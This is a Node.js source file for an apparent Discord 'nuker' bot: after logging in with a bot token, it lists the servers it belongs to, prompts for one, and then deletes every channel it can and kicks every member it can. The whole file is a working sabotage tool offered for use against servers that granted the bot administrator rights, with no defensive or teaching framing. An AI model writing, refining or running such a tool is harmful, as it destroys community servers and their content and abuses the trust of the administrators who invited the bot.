const djs    = require("discord.js");
const prompt = require('prompt-sync')({sigint: true});


const PRINT_ERROR = true;
const LEAVE_GUILD = false;


const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));


const client = new djs.Client({
    intents: [
        djs.Intents.FLAGS.GUILDS,
        djs.Intents.FLAGS.GUILD_BANS,
        djs.Intents.FLAGS.GUILD_INVITES,
        djs.Intents.FLAGS.GUILD_MEMBERS,
        djs.Intents.FLAGS.GUILD_MESSAGES,
        djs.Intents.FLAGS.GUILD_PRESENCES,
        djs.Intents.FLAGS.GUILD_VOICE_STATES,
        djs.Intents.FLAGS.GUILD_MESSAGE_TYPING,
        djs.Intents.FLAGS.GUILD_SCHEDULED_EVENTS,
        djs.Intents.FLAGS.GUILD_MESSAGE_REACTIONS,
        djs.Intents.FLAGS.GUILD_EMOJIS_AND_STICKERS,
        
        djs.Intents.FLAGS.DIRECT_MESSAGES,
        djs.Intents.FLAGS.DIRECT_MESSAGE_TYPING,
        djs.Intents.FLAGS.DIRECT_MESSAGE_REACTIONS,
    ]
});


client.on("guildCreate", async g => {
    if (g.me.permissions.missing("ADMINISTRATOR"))
        g.leave();
});


client.once("ready", _ => {
    console.log("ready");
});


/**
 * @param {djs.Guild} g
 */
const nuke = async g => {
    g = await g.fetch();

    const members  = g.members .cache;
    const channels = g.channels.cache;

    try {
        await Promise.all([
            new Promise(async _ => {
                for (const channel of channels.values()) {            
                    if ("deletable" in channel &&
                        channel.deletable) channel.delete();
        
                    await sleep(300);
                }
            }),
            new Promise(async _ => {
                for (const member of members.values()) {
                    if (member.kickable) member.kick();
        
                    await sleep(300);
                }
            }),
        ]);

    } catch (e) {
        if (PRINT_ERROR) console.error(e);
    } finally { 
        if (LEAVE_GUILD) g.leave();
    }
};

async function Main () {
    ///////////////////////////////////////////////////////
    await client.login("PUT UR TOKEN RIGHT HERE");
    ///////////////////////////////////////////////////////
    
    while (true) {
        let tmp = "";
        for (const g of (await client.guilds.fetch()).values())
            tmp += "\"" + g.name + "\": " + g.id + "\n";
        console.log(tmp);

        const id = prompt("Enter the ID of the guild you want to nuke: ");
        
        const guild = client.guilds.cache.find((_, k) => k === id);
        if (guild) {
            if (prompt(`Are you sure to nuke \`${guild.name}\`? (y/N): `)
                    .toLowerCase() === "y"
            ) {
                console.log("Started")
                await nuke(guild);
            }
        }
    
        else console.log("Guild not found.");
    }
}

Main();
